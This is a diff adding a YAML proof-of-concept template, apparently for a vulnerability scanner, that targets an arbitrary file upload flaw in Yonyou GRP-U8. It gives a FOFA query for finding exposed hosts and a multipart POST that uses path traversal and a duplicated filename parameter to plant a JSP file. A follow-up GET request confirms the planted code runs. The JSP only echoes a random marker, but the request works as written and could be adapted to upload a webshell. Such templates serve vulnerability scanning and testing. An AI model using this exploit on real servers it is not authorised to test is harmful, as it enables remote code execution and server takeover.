@@ -1,0 +1,44 @@
+id: poc-yaml-yongyou-grp-u8-uploadfiledata-anyfile-upload
+info:
+  name: 用友 GRP-U8 UploadFileData 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  random_content: random_str(12)
+  random_name: random_str(8)
+  path: '/R9iPortal
+
+    /R9iPortal/upload
+
+    '
+requests:
+- method: POST
+  path: /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={{.random_name}}.jsp&filename=1.jpg
+  headers:
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: multipart/form-data
+  data: '------WebKitFormBoundary92pUawKc
+
+    Content-Disposition: form-data; name="myFile";filename="test.jpg"
+
+
+    <% out.println("{{.random_content}}");%>
+
+    ------WebKitFormBoundary92pUawKc--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"showSucceedMsg")
+
+    '
+- method: GET
+  path: '{{.path}}/{{.random_name}}.jsp'
+  expression: 'status_code == 200 &&
+
+    contains(body,random_content)
+
+    '
+transport: http
